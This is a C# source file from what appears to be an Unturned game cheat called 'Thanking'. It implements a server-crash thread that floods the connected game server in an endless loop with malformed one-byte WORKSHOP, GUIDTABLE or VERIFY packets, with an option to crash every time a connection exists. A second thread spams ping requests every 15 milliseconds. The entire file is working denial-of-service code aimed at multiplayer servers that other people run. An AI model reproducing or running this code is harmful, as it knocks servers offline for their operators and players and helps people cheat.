using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Xml.Schema;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            byte[] P1 = {(byte) ESteamPacket.WORKSHOP};
            byte[] P2 = {(byte) ESteamPacket.GUIDTABLE};
            byte[] P3 = {(byte) ESteamPacket.VERIFY};

            int S1 = P1.Length;
            int S2 = P2.Length;
            int S3 = P3.Length;
            
            while (true)
            {
                if (AlwaysCrash && OV_Provider.IsConnected)
                    ServerCrashEnabled = true;

                if (ServerCrashEnabled)
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, P1, S1, 0);
                            break;
                        case 2:
                            Provider.send(Provider.server, ESteamPacket.GUIDTABLE, P2, S2, 0);
                            break;
                        case 3:
                            Provider.send(Provider.server, ESteamPacket.VERIFY, P3, S3, 0);
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }

        [Thread]
        public static void PingCheck()
        {
            while (true)
            {
                Thread.Sleep(15);
                
                if (!OV_Provider.IsConnected)
                    continue;
                
                Provider.send(Provider.server, ESteamPacket.PING_REQUEST, new byte[]
                {
                    13
                }, 1, 0);
            }
        }
    }
}
